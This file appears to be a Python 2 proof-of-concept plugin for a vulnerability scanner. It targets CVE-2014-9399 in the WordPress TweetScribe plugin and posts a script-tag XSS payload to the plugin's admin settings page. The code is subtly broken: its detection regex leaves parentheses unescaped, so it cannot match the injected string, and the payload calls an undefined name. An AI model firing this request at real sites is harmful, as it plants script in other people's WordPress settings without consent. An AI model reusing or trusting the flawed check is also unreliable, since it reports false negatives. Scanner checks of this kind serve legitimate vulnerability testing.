# coding: utf-8
import re
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'WordPress_0143' # 平台漏洞编号
    name = 'WordPress插件TweetScribe跨站请求伪造' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2015-01-09'  # 漏洞公布时间
    desc = '''模版漏洞描述
    WordPress是一种使用PHP语言开发的博客平台，用户可以在支持PHP和MySQL数据库的服务器上架设自己的网志。TweetScribe plugin是一款可通过tweetscribe.me网站使用Twitter帐户订阅WordPress博客的插件。
    WordPress插件TweetScribe存在跨站请求伪造漏洞，允许远程攻击者利用漏洞劫持管理员的请求认证。
    ''' # 漏洞描述
    ref = 'http://packetstormsecurity.com/files/129645/WordPress-TweetScribe-1.1-CSRF-XSS.html, https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9399' # 漏洞来源
    cnvd_id = 'CNVD-2015-00169' # cnvd漏洞编号
    cve_id = 'CVE-2014-9399'  # cve编号
    product = 'WordPress'  # 漏洞组件名称
    product_version = 'WordPress TweetScribe plugin <=1.1'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '3ef8d962-b36d-4bf6-bd6c-29016a5c822e' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            url = self.target + '/wordpress/wp-admin/options-general.php?page=tweetscribe/tweetscribe.php&op=save'
            payload = {
                'tweetscribe_username':'><script>alert(csan)</script>',
                'tweetscribe_password':'mdndnnd',
                'tweetscribe_text':'test'
            }
            response = requests.post(url, data=payload)
            xss_pattrn = re.compile(r'<script>alert(csan)</script>')
            if xss_pattrn.findall(response.text):    
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                                target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()